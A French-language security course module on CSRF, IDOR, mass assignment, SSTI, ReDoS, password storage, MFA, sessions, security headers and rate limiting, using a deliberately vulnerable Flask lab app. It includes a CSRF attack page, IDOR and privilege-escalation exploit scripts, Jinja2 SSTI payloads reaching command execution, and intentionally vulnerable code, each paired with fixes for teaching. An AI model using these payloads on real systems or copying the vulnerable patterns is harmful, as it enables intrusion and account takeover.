# Security By Design: SÉANCE 2 : Autorisations, authentification et Security by Design (3h30)

---

## Module 2.1 - Cross-Site Request Forgery / CSRF (30 min)

### 2.1.1 Principe d'attaque

CSRF exploite la confiance d'un site envers un utilisateur authentifié. Le navigateur envoie automatiquement les cookies de session, même pour des requêtes initiées depuis un autre site.

**Scénario type** : le navigateur envoie automatiquement les cookies de session pour le domaine de destination, même si la requête est initiée depuis un site tiers. L'attaquant n'a pas besoin de connaître le cookie, c'est le navigateur qui le fournit.

```mermaid
sequenceDiagram
    participant A as Alice (navigateur)
    participant B as Blog piégé (attaquant)
    participant V as VulnPyApp
    A->>V: Connexion
    V-->>A: Cookie de session
    A->>B: Visite blog-piege.com
    B-->>A: Page avec formulaire caché<br/>action: POST /profile/update
    Note over A: JS soumet le formulaire automatiquement
    A->>V: POST /profile/update<br/>(avec cookie session)
    Note over A,V: Cookie envoyé automatiquement<br/>car destination = vulnpyapp.local
    V->>V: Pas de vérification CSRF<br/>requête traitée comme légitime
    V-->>A: Profil modifié sans consentement
```

### 2.1.2 Exploitation

**Création d'une page malveillante** :

```python
# attacker_server.py - serveur d'attaque pour PoC
from flask import Flask, request

attacker_app = Flask(__name__)

@attacker_app.route('/')
def malicious_page():
    return """
    <!DOCTYPE html>
    <html>
    <head><title>Vous avez gagné !</title></head>
    <body>
        <h1>🎁 Félicitations ! Cliquez pour réclamer</h1>

        <!-- Attaque CSRF cachée : modification du profil de la victime -->
        <form id="csrf-attack"
              action="http://localhost:5000/profile/update"
              method="POST"
              style="display:none">
            <input name="username" value="pwned-by-csrf">
            <input name="bio" value="This account was hijacked via CSRF.">
        </form>

        <script>
            // Soumission automatique au chargement
            document.getElementById('csrf-attack').submit();
        </script>
    </body>
    </html>
    """

@attacker_app.route('/log', methods=['POST', 'GET'])
def log_stolen_data():
    print(f"📥 Données reçues : {request.values.to_dict()}")
    return '', 204

if __name__ == '__main__':
    attacker_app.run(port=8000)
```

**Script Python d'exploitation automatisée** :

```python
# scripts/csrf_demo.py
import requests

# Simulation : Alice est connectée
session = requests.Session()
session.post('http://localhost:5000/login', data={
    'email': 'alice@vulnpyapp.local',
    'password': 'Alice123!'
})

# L'attaquant fait une requête depuis "l'extérieur" avec la session d'Alice
# (simulant une requête déclenchée par une page malveillante)
response = session.post(
    'http://localhost:5000/profile/update',
    data={
        'username': 'pwned-by-csrf',
        'bio': 'This account was hijacked via CSRF.'
    },
    headers={
        # Pas de header Origin/Referer ou un mauvais
        'Origin': 'http://attacker.com'
    }
)

if response.status_code == 200:
    print("🚨 ATTAQUE CSRF RÉUSSIE - L'application est vulnérable")
else:
    print(f"✅ Protection active (status: {response.status_code})")
```

### 2.1.3 Protections en Python/Flask

**Méthode 1 : Tokens CSRF avec Flask-WTF**

```python
# ✅ SÉCURISÉ - Flask-WTF
from flask import Flask
from flask_wtf.csrf import CSRFProtect
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField
from wtforms.validators import DataRequired, Length

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-very-long-random-secret'
csrf = CSRFProtect(app)

class PasswordChangeForm(FlaskForm):
    new_password = PasswordField('Nouveau mot de passe',
                                  validators=[DataRequired(), Length(min=12)])
    confirm_password = PasswordField('Confirmation',
                                      validators=[DataRequired()])

@app.route('/account/change-password', methods=['GET', 'POST'])
def change_password():
    form = PasswordChangeForm()
    if form.validate_on_submit():  # Vérifie le CSRF token
        # Logique de changement
        return redirect('/account')
    return render_template('change_password.html', form=form)
```

```html
<!-- templates/change_password.html -->
<form method="POST">
    {{ form.csrf_token }}  <!-- Token CSRF automatique -->
    {{ form.new_password.label }} {{ form.new_password }}
    {{ form.confirm_password.label }} {{ form.confirm_password }}
    <button type="submit">Changer</button>
</form>
```

**Méthode 2 : CSRF pour API JSON (header)**

```python
# ✅ SÉCURISÉ - CSRF pour API
from functools import wraps
import secrets
from flask import session, request, jsonify

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
    return session['csrf_token']

def csrf_protect(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            token = request.headers.get('X-CSRF-Token')
            if not token or token != session.get('csrf_token'):
                return jsonify({'error': 'CSRF token invalide'}), 403
        return f(*args, **kwargs)
    return decorated

@app.route('/api/csrf-token')
def get_csrf_token():
    return jsonify({'csrf_token': generate_csrf_token()})

@app.route('/api/account', methods=['PUT'])
@csrf_protect
def update_account():
    # Logique sécurisée
    pass
```

**Méthode 3 : SameSite Cookies (défense en profondeur)**

```python
# ✅ Configuration cookies avec SameSite
app.config.update(
    SESSION_COOKIE_SECURE=True,        # HTTPS uniquement
    SESSION_COOKIE_HTTPONLY=True,      # Pas accessible via JS
    SESSION_COOKIE_SAMESITE='Strict',  # Bloque les requêtes cross-site
)
```

**Détail des modes SameSite** :

| Mode | Comportement | Protection CSRF |
|------|-------------|-----------------|
| `Strict` | Cookie jamais envoyé en cross-site | Maximale, mais peut casser les liens entrants |
| `Lax` (défaut) | Cookie envoyé pour les navigations GET top-level | Bon équilibre par défaut |
| `None` | Cookie envoyé pour toutes les requêtes | Aucune (nécessite `Secure` + HTTPS) |

**Méthode 4 : Vérification d'origine**

```python
# ✅ Vérification Origin/Referer
ALLOWED_ORIGINS = ['https://app.com', 'https://www.app.com']

@app.before_request
def check_csrf_origin():
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        origin = request.headers.get('Origin') or request.headers.get('Referer', '').rstrip('/')
        if not any(origin.startswith(o) for o in ALLOWED_ORIGINS):
            abort(403, description="Origin non autorisée")
```

---

## Module 2.2 - Insecure Direct Object Reference / IDOR (30 min)

### 2.2.1 Principe

IDOR se produit quand l'application expose une référence directe à un objet (ID en URL, paramètre) sans vérifier que l'utilisateur a le droit d'y accéder.

### 2.2.2 Exemples vulnérables

```python
# 🚨 VULNÉRABLE - Pas de vérification de propriété
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(order.to_dict())
# Un utilisateur peut accéder à n'importe quelle commande !

# 🚨 VULNÉRABLE - Modification sans vérification
@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    user = User.query.get(user_id)
    user.email = request.json.get('email')
    db.session.commit()
    return jsonify(user.to_dict())
# Un utilisateur peut modifier le compte d'un autre !
```

**Comparaison accès vulnérable vs sécurisé** : dans le cas vulnérable, la fonction ne vérifie pas le propriétaire de l'objet. Dans le cas sécurisé, la requête filtre par utilisateur courant.

```mermaid
graph TD
    subgraph Vulnérable
        V1[GET /api/orders/5] --> V2[Order.query.get(5)]
        V2 --> V3[Retourne la commande<br/>sans vérifier le propriétaire]
    end
    subgraph Sécurisé
        S1[GET /api/orders/5] --> S2[Order.query.filter_by<br/>id=5, user_id=current_user.id]
        S2 --> S3{user_id correspond?}
        S3 -->|Oui| S4[Retourne la commande]
        S3 -->|Non| S5[403 Accès interdit]
    end
```

### 2.2.3 Exploitation

```python
# scripts/exploit_idor.py
import requests

# Connexion en tant qu'utilisateur normal (Bob)
session = requests.Session()
session.post('http://localhost:5000/login', data={
    'email': 'bob@vulnpyapp.local',
    'password': 'Bob123!'
})

print("🔍 Test IDOR sur /api/orders/<id>")
for order_id in range(1, 20):
    r = session.get(f'http://localhost:5000/api/orders/{order_id}')
    if r.status_code == 200:
        data = r.json()
        # Bob accède à des commandes qui ne sont pas les siennes
        if data.get('user_id') != 3:  # Bob = id 3
            print(f"🚨 IDOR : commande {order_id} appartient à user {data['user_id']}")
            print(f"   Données : {data}")

print("\n🔍 Test info-disclosure sur /api/users/<id>")
# L'endpoint GET expose is_admin et email d'autres utilisateurs (vraie vuln)
r = session.get('http://localhost:5000/api/users/1')  # id 1 = admin
if r.status_code == 200:
    data = r.json()
    print(f"🚨 Fuite : compte admin exposé → {data}")
    # → {'id': 1, 'email': 'admin@vulnpyapp.local', 'is_admin': True, ...}
```

### 2.2.4 Protection : vérification d'autorisation

**Méthode 1 : Vérification explicite de propriété**

```python
# ✅ SÉCURISÉ - Vérification de propriété
from flask_login import current_user, login_required

@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get_or_404(order_id)

    # Vérifier que l'utilisateur est propriétaire ou admin
    if order.user_id != current_user.id and not current_user.is_admin:
        abort(403, description="Accès interdit")

    return jsonify(order.to_dict())
```

**Méthode 2 : Filtrage par utilisateur (recommandé)**

```python
# ✅ SÉCURISÉ - Filtrage à la source
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    # La requête elle-même filtre par utilisateur
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(order.to_dict())

# Encore mieux : ne pas exposer les IDs du tout
@app.route('/api/my/orders')
@login_required
def my_orders():
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])
```

**Méthode 3 : Décorateur d'autorisation**

```python
# ✅ SÉCURISÉ - Décorateur réutilisable
from functools import wraps

def require_ownership(model, id_param='id', owner_field='user_id'):
    def decorator(f):
        @wraps(f)
        @login_required
        def decorated(*args, **kwargs):
            obj_id = kwargs.get(id_param)
            obj = model.query.get_or_404(obj_id)

            if getattr(obj, owner_field) != current_user.id and not current_user.is_admin:
                abort(403)

            kwargs['obj'] = obj
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/orders/<int:id>')
@require_ownership(Order)
def get_order(id, obj):
    return jsonify(obj.to_dict())
```

**Méthode 4 : Identifiants non prédictibles (UUID)**

```python
# ✅ SÉCURISÉ - UUID au lieu d'IDs séquentiels
import uuid
from sqlalchemy.dialects.postgresql import UUID

class Order(db.Model):
    id = db.Column(db.Integer, primary_key=True)  # Interne uniquement
    public_id = db.Column(db.String(36), unique=True,
                          default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))

# Exposer uniquement le public_id
@app.route('/api/orders/<string:public_id>')
@login_required
def get_order(public_id):
    order = Order.query.filter_by(
        public_id=public_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(order.to_dict())
```

---

## Module 2.3 - Mass Assignment et autres vulnérabilités (30 min)

### 2.3.1 Mass Assignment

**Principe** : l'application accepte aveuglément tous les champs envoyés par l'utilisateur. Si le modèle User a un champ sensible comme `is_admin`, l'attaquant peut injecter sa valeur dans la requête POST pour s'élever en privilèges.

```mermaid
graph LR
    subgraph Attaque
        A1[Inscription] --> A2[Champs normaux : email, password, name]
        A2 --> A3[Champ injecté : is_admin=true]
        A3 --> A4[User(**data) crée un compte admin]
    end
    subgraph Protection
        B1[Inscription] --> B2[Schéma explicite<br/>extra = forbid]
        B2 --> B3[Champ inconnu rejeté<br/>400 Bad Request]
    end
```

```python
# 🚨 VULNÉRABLE - extrait de VulnPyApp app.py
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        # 🚨 VULNÉRABLE : tous les champs du formulaire passent au modèle
        data = request.form.to_dict()
        user = User(**{k: v for k, v in data.items() if k != 'password'})
        user.set_password(data.get('password', ''))
        db.session.add(user)
        db.session.commit()
        login_user(user)
        return redirect(url_for('profile'))
```

**Exploitation** :

```python
# scripts/exploit_mass_assignment.py
import requests

# Création d'un compte avec is_admin=true injecté dans le formulaire
r = requests.post('http://localhost:5000/register', data={
    'email': 'evil@attacker.com',
    'username': 'evil',
    'password': 'Evil123!',
    'bio': 'Pwned',
    'is_admin': 'true',  # 🎯 Champ non prévu mais accepté par User(**data)
})

# Vérification : connexion et accès au panel admin
s = requests.Session()
s.post('http://localhost:5000/login', data={
    'email': 'evil@attacker.com',
    'password': 'Evil123!'
})
admin_page = s.get('http://localhost:5000/admin')

if admin_page.status_code == 200:
    print("🚨 Élévation de privilèges réussie via mass assignment !")
```

**Protections** :

```python
# ✅ SÉCURISÉ - Whitelist explicite
ALLOWED_FIELDS = {'email', 'name', 'phone', 'avatar'}

@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    if user_id != current_user.id:
        abort(403)

    user = User.query.get_or_404(user_id)
    data = request.get_json()

    # Filtrer aux champs autorisés uniquement
    for key in ALLOWED_FIELDS & data.keys():
        setattr(user, key, data[key])

    db.session.commit()
    return jsonify(user.to_dict())

# ✅ MEILLEUR - Validation avec Pydantic
from pydantic import BaseModel, EmailStr, constr, ValidationError

class UserUpdateSchema(BaseModel):
    email: EmailStr | None = None
    name: constr(max_length=100) | None = None
    phone: constr(pattern=r'^\+?[0-9]{10,15}$') | None = None

    class Config:
        extra = 'forbid'  # Rejette les champs inconnus

@app.route('/api/users/<int:user_id>', methods=['PUT'])
@login_required
def update_user(user_id):
    if user_id != current_user.id:
        abort(403)

    try:
        data = UserUpdateSchema(**request.get_json())
    except ValidationError as e:
        return jsonify({'errors': e.errors()}), 400

    user = User.query.get_or_404(user_id)
    for field, value in data.dict(exclude_unset=True).items():
        setattr(user, field, value)

    db.session.commit()
    return jsonify(user.to_dict())
```

### 2.3.2 Server-Side Template Injection (SSTI)

**Principe** : injection dans un template côté serveur, peut mener à du RCE.

```python
# 🚨 VULNÉRABLE - Jinja2 SSTI
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}</h1>"  # Concaténation dans template !
    return render_template_string(template)
```

**Exploitation** :

```python
# Payloads SSTI Jinja2
payloads = [
    # Détection
    "{{7*7}}",                    # Affiche 49 si vulnérable
    "{{config}}",                 # Fuite de configuration Flask

    # RCE complet
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
]
```

**Protection** :

```python
# ✅ SÉCURISÉ - Variables passées au template
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Le template est statique, name est une variable échappée
    return render_template_string("<h1>Hello {{ name }}</h1>", name=name)

# ✅ ENCORE MIEUX - Templates dans des fichiers
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    return render_template('hello.html', name=name)
```

### 2.3.3 ReDoS (Regular Expression Denial of Service)

**Principe** : certaines regex ont une complexité exponentielle sur des inputs spécifiques.

```python
# 🚨 VULNÉRABLE - Regex avec backtracking catastrophique
import re

EMAIL_REGEX = re.compile(r'^([a-zA-Z0-9]+)+@example\.com$')

# Cette validation peut prendre plusieurs minutes !
def is_valid_email(email):
    return bool(EMAIL_REGEX.match(email))

# Attaque : input crafté
malicious_input = "a" * 30 + "!"  # Cause un backtracking exponentiel
```

**Protections** :

```python
# ✅ SÉCURISÉ - Bibliothèque re2 (linear time)
import re2 as re  # Drop-in replacement sans backtracking

# ✅ SÉCURISÉ - Timeout sur regex
import signal

class RegexTimeout(Exception):
    pass

def with_timeout(seconds):
    def handler(signum, frame):
        raise RegexTimeout()
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(seconds)

def safe_regex_match(pattern, text, timeout=1):
    try:
        with_timeout(timeout)
        result = re.match(pattern, text)
        signal.alarm(0)
        return result
    except RegexTimeout:
        return None

# ✅ SÉCURISÉ - Limitation de taille d'input
def is_valid_email(email):
    if len(email) > 254:  # RFC 5321
        return False
    return bool(EMAIL_REGEX.match(email))

# ✅ MIEUX - Validation simple sans regex complexe
from email_validator import validate_email, EmailNotValidError

def is_valid_email(email):
    try:
        validate_email(email)
        return True
    except EmailNotValidError:
        return False
```

---

## Module 2.4 - Authentification sécurisée (45 min)

### 2.4.1 Stockage des mots de passe

**Hiérarchie de mauvaises à bonnes pratiques** :

```python
import hashlib

# 🔥 CATASTROPHE - Stockage en clair
db.save({'password': password})

# 🚨 MAUVAIS - Hash rapide sans sel
hashed = hashlib.md5(password.encode()).hexdigest()  # MD5 est cassé
hashed = hashlib.sha256(password.encode()).hexdigest()  # Trop rapide → bruteforce GPU

# ⚠️ INSUFFISANT - Hash avec sel mais non itéré
salt = os.urandom(16)
hashed = hashlib.sha256(salt + password.encode()).hexdigest()

# ✅ BON - bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# ✅ EXCELLENT - Argon2 (recommandé OWASP)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)
```

**Évolution des techniques** : chaque étape ajoute une couche de protection. Le sel empêche les rainbow tables, l'itération ralentit le bruteforce, Argon2 résiste aux attaques GPU/ASIC.

```mermaid
graph BT
    C1[Stockage en clair] --> C2[MD5 sans sel]
    C2 --> C3[SHA-256 sans sel]
    C3 --> C4[SHA-256 + sel]
    C4 --> C5[bcrypt rounds=12]
    C5 --> C6[Argon2id]
    C1 -. 0 seconde .-> T[Temps pour casser un mot de passe]
    C2 -. secondes .-> T
    C3 -. minutes .-> T
    C4 -. heures .-> T
    C5 -. jours .-> T
    C6 -. années .-> T
```

### 2.4.2 Implémentation complète

```python
# auth.py - Module d'authentification sécurisé
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
import secrets
import re
from datetime import datetime, timedelta

ph = PasswordHasher(
    time_cost=3,        # Itérations
    memory_cost=65536,  # 64 MB
    parallelism=4
)

class PasswordPolicy:
    """Politique de mots de passe forte (OWASP)"""
    MIN_LENGTH = 12
    MAX_LENGTH = 128
    MIN_UPPERCASE = 1
    MIN_LOWERCASE = 1
    MIN_DIGITS = 1
    MIN_SPECIAL = 1

    # Top 10000 mots de passe les plus utilisés (à charger)
    COMMON_PASSWORDS = set()

    @classmethod
    def validate(cls, password: str) -> tuple[bool, list[str]]:
        errors = []

        if len(password) < cls.MIN_LENGTH:
            errors.append(f"Au moins {cls.MIN_LENGTH} caractères requis")
        if len(password) > cls.MAX_LENGTH:
            errors.append(f"Maximum {cls.MAX_LENGTH} caractères")
        if sum(c.isupper() for c in password) < cls.MIN_UPPERCASE:
            errors.append("Au moins une majuscule requise")
        if sum(c.islower() for c in password) < cls.MIN_LOWERCASE:
            errors.append("Au moins une minuscule requise")
        if sum(c.isdigit() for c in password) < cls.MIN_DIGITS:
            errors.append("Au moins un chiffre requis")
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Au moins un caractère spécial requis")
        if password.lower() in cls.COMMON_PASSWORDS:
            errors.append("Ce mot de passe est trop courant")

        return len(errors) == 0, errors


class AuthService:
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash un mot de passe avec Argon2"""
        return ph.hash(password)

    @staticmethod
    def verify_password(password: str, hashed: str) -> bool:
        """Vérifie un mot de passe en temps constant"""
        try:
            ph.verify(hashed, password)
            return True
        except VerifyMismatchError:
            return False

    @staticmethod
    def needs_rehash(hashed: str) -> bool:
        """Détermine si le hash doit être recalculé (paramètres obsolètes)"""
        return ph.check_needs_rehash(hashed)


def register(email: str, password: str):
    # Validation politique
    valid, errors = PasswordPolicy.validate(password)
    if not valid:
        raise ValueError(f"Mot de passe invalide : {', '.join(errors)}")

    # Vérification HaveIBeenPwned (optionnel)
    if is_password_pwned(password):
        raise ValueError("Ce mot de passe a été compromis dans une fuite connue")

    # Hash et stockage
    user = User(
        email=email.lower().strip(),
        password_hash=AuthService.hash_password(password),
        created_at=datetime.utcnow()
    )
    db.session.add(user)
    db.session.commit()
    return user


def login(email: str, password: str):
    user = User.query.filter_by(email=email.lower().strip()).first()

    if not user:
        # IMPORTANT : effectuer un hash factice pour éviter l'énumération via timing
        AuthService.hash_password("dummy_password_to_match_timing")
        raise AuthenticationError("Identifiants invalides")

    if user.locked_until and user.locked_until > datetime.utcnow():
        raise AuthenticationError("Compte verrouillé temporairement")

    if not AuthService.verify_password(password, user.password_hash):
        user.failed_attempts += 1
        if user.failed_attempts >= 5:
            user.locked_until = datetime.utcnow() + timedelta(minutes=15)
        db.session.commit()
        raise AuthenticationError("Identifiants invalides")

    # Reset compteur + rehash si nécessaire
    user.failed_attempts = 0
    user.last_login = datetime.utcnow()
    if AuthService.needs_rehash(user.password_hash):
        user.password_hash = AuthService.hash_password(password)
    db.session.commit()

    return user


def is_password_pwned(password: str) -> bool:
    """Vérification via API HaveIBeenPwned (k-anonymity)"""
    import requests
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]

    response = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}',
                            timeout=2)
    if response.status_code == 200:
        return suffix in response.text
    return False
```

### 2.4.3 Réinitialisation de mot de passe sécurisée

```python
# password_reset.py
import secrets
from datetime import datetime, timedelta

class PasswordResetToken(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    token_hash = db.Column(db.String(64), unique=True)
    expires_at = db.Column(db.DateTime)
    used_at = db.Column(db.DateTime, nullable=True)

@app.route('/forgot-password', methods=['POST'])
@rate_limit('5 per hour')
def forgot_password():
    email = request.form.get('email', '').lower().strip()
    user = User.query.filter_by(email=email).first()

    # Toujours répondre OK pour ne pas révéler l'existence d'un compte
    response_message = "Si un compte existe, un email a été envoyé"

    if user:
        # Générer token cryptographiquement sûr
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()

        # Stocker le HASH du token (pas le token en clair)
        reset = PasswordResetToken(
            user_id=user.id,
            token_hash=token_hash,
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        db.session.add(reset)
        db.session.commit()

        # Envoyer email (le token n'est jamais stocké en clair en BDD)
        send_reset_email(user.email, token)

    return jsonify({'message': response_message})


@app.route('/reset-password', methods=['POST'])
def reset_password():
    token = request.form.get('token')
    new_password = request.form.get('new_password')

    token_hash = hashlib.sha256(token.encode()).hexdigest()
    reset = PasswordResetToken.query.filter_by(token_hash=token_hash).first()

    if not reset or reset.expires_at < datetime.utcnow() or reset.used_at:
        abort(400, description="Token invalide ou expiré")

    # Validation politique
    valid, errors = PasswordPolicy.validate(new_password)
    if not valid:
        return jsonify({'errors': errors}), 400

    # Réinitialiser
    user = User.query.get(reset.user_id)
    user.password_hash = AuthService.hash_password(new_password)
    reset.used_at = datetime.utcnow()  # Token à usage unique

    # Invalider toutes les autres sessions
    invalidate_user_sessions(user.id)

    db.session.commit()

    # Notification de sécurité
    send_security_notification(user.email, "Mot de passe modifié")

    return jsonify({'message': 'Mot de passe réinitialisé'})
```

### 2.4.4 Multi-Factor Authentication (TOTP)

```python
# mfa.py - Implémentation TOTP
import pyotp
import qrcode
import io
import base64

class MFAService:
    @staticmethod
    def generate_secret() -> str:
        """Génère un secret TOTP base32"""
        return pyotp.random_base32()

    @staticmethod
    def generate_qr_code(user_email: str, secret: str) -> str:
        """Génère un QR code pour Google Authenticator"""
        uri = pyotp.totp.TOTP(secret).provisioning_uri(
            name=user_email,
            issuer_name='VulnPyApp'
        )
        img = qrcode.make(uri)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode()

    @staticmethod
    def verify_token(secret: str, token: str) -> bool:
        """Vérifie un code TOTP avec fenêtre de tolérance"""
        totp = pyotp.TOTP(secret)
        return totp.verify(token, valid_window=1)  # ±30s

@app.route('/mfa/setup', methods=['POST'])
@login_required
def setup_mfa():
    secret = MFAService.generate_secret()
    # Stocker en attente (pas encore activé)
    current_user.mfa_secret_pending = secret
    db.session.commit()

    return jsonify({
        'qr_code': MFAService.generate_qr_code(current_user.email, secret),
        'manual_entry': secret
    })

@app.route('/mfa/verify', methods=['POST'])
@login_required
def verify_mfa_setup():
    token = request.json.get('token')
    if MFAService.verify_token(current_user.mfa_secret_pending, token):
        current_user.mfa_secret = current_user.mfa_secret_pending
        current_user.mfa_enabled = True
        current_user.mfa_secret_pending = None
        # Générer des backup codes
        backup_codes = [secrets.token_hex(4) for _ in range(10)]
        current_user.backup_codes = [hashlib.sha256(c.encode()).hexdigest()
                                       for c in backup_codes]
        db.session.commit()
        return jsonify({'backup_codes': backup_codes})
    return jsonify({'error': 'Code invalide'}), 400
```

**Facteurs d'authentification** : le MFA combine au moins deux facteurs parmi :
- **Ce que je sais** : mot de passe, code PIN
- **Ce que je possède** : smartphone (TOTP), clé de sécurité (FIDO2/WebAuthn)
- **Ce que je suis** : empreinte digitale, reconnaissance faciale

---

## Module 2.5 - Sessions, cookies et headers (30 min)

### 2.5.1 Configuration sessions sécurisées

```python
# config.py
import secrets
from datetime import timedelta

class Config:
    # Secret key forte (32 bytes minimum)
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

    # Sessions
    SESSION_TYPE = 'redis'  # Sessions côté serveur (pas en cookie)
    SESSION_REDIS = redis.Redis(host='localhost', port=6379)
    PERMANENT_SESSION_LIFETIME = timedelta(hours=1)
    SESSION_PERMANENT = False

    # Cookies de session
    SESSION_COOKIE_NAME = 'app_session'  # Pas le nom par défaut
    SESSION_COOKIE_SECURE = True         # HTTPS uniquement
    SESSION_COOKIE_HTTPONLY = True       # Inaccessible via JS
    SESSION_COOKIE_SAMESITE = 'Strict'   # Protection CSRF
    SESSION_COOKIE_DOMAIN = '.app.com'
    SESSION_COOKIE_PATH = '/'

    # Régénération de session
    SESSION_REFRESH_EACH_REQUEST = True
```

### 2.5.2 Gestion de session sécurisée

```python
# session_manager.py
from flask import session
import secrets

class SessionManager:
    @staticmethod
    def login_user(user):
        """Connexion : régénération complète de la session"""
        # Sauvegarder éventuels flash messages
        flash_messages = session.get('_flashes', [])

        # Vider et régénérer la session (anti-fixation)
        session.clear()
        session.regenerate() if hasattr(session, 'regenerate') else None

        # Nouvelle session
        session['user_id'] = user.id
        session['session_id'] = secrets.token_urlsafe(32)
        session['ip'] = request.remote_addr
        session['user_agent'] = request.headers.get('User-Agent', '')
        session['created_at'] = datetime.utcnow().isoformat()

        if flash_messages:
            session['_flashes'] = flash_messages

    @staticmethod
    def logout_user():
        """Déconnexion : destruction complète"""
        session.clear()

    @staticmethod
    def validate_session():
        """Validation à chaque requête"""
        if 'user_id' not in session:
            return False

        # Vérifier que l'IP n'a pas changé (anti-hijacking)
        if session.get('ip') != request.remote_addr:
            session.clear()
            return False

        # Vérifier le user agent
        if session.get('user_agent') != request.headers.get('User-Agent', ''):
            session.clear()
            return False

        # Limite de durée absolue
        created = datetime.fromisoformat(session.get('created_at'))
        if datetime.utcnow() - created > timedelta(hours=12):
            session.clear()
            return False

        return True

@app.before_request
def check_session():
    if request.endpoint and 'auth' in request.endpoint:
        return  # Pas de check sur les endpoints d'auth
    if 'user_id' in session and not SessionManager.validate_session():
        abort(401)
```

### 2.5.3 Headers de sécurité avec Talisman

```python
# security_headers.py
from flask_talisman import Talisman

csp = {
    'default-src': "'self'",
    'script-src': ["'self'", "'nonce-{nonce}'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", 'data:', 'https:'],
    'font-src': ["'self'", 'https://fonts.gstatic.com'],
    'connect-src': "'self'",
    'frame-ancestors': "'none'",
    'form-action': "'self'",
    'base-uri': "'self'",
    'object-src': "'none'",
    'upgrade-insecure-requests': '',
}

Talisman(
    app,
    # HTTPS
    force_https=True,
    force_https_permanent=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    strict_transport_security_include_subdomains=True,
    strict_transport_security_preload=True,

    # CSP
    content_security_policy=csp,
    content_security_policy_nonce_in=['script-src'],

    # Autres headers
    frame_options='DENY',
    referrer_policy='strict-origin-when-cross-origin',
    feature_policy={
        'geolocation': "'none'",
        'microphone': "'none'",
        'camera': "'none'",
    },

    # Cookies
    session_cookie_secure=True,
    session_cookie_http_only=True,
)

# Headers complémentaires
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'

    # Désactiver le cache pour pages sensibles
    if request.path.startswith('/account'):
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
    return response
```

---

## Module 2.6 - Protection anti-bot et rate limiting (25 min)

### 2.6.1 Rate Limiting avec Flask-Limiter

```python
# rate_limiting.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379",  # Stockage distribué
    strategy="fixed-window"  # ou "moving-window" pour plus de précision
)

# Endpoints sensibles : limites strictes
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute; 20 per hour")
def login():
    pass

@app.route('/forgot-password', methods=['POST'])
@limiter.limit("3 per hour")
def forgot_password():
    pass

@app.route('/api/search')
@limiter.limit("30 per minute")
def search():
    pass

# Limite custom par utilisateur authentifié
def user_or_ip():
    if current_user.is_authenticated:
        return f"user:{current_user.id}"
    return get_remote_address()

@app.route('/api/heavy-operation')
@limiter.limit("10 per hour", key_func=user_or_ip)
def heavy_op():
    pass

# Réponse personnalisée
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': 'Trop de requêtes',
        'retry_after': e.description
    }), 429
```

**Stratégies de comptage** :
- **Fixed Window** : compteur remis à zéro à intervalle fixe (ex. toutes les minutes) - simple mais peut laisser passer des pics en fin de fenêtre
- **Sliding Window** : fenêtre glissante plus précise (ex. dernière minute glissante à tout instant) - recommandé pour les endpoints sensibles
- **Token Bucket** : nombre fixe de tokens consommés par requête, régénérés périodiquement - lisse le trafic

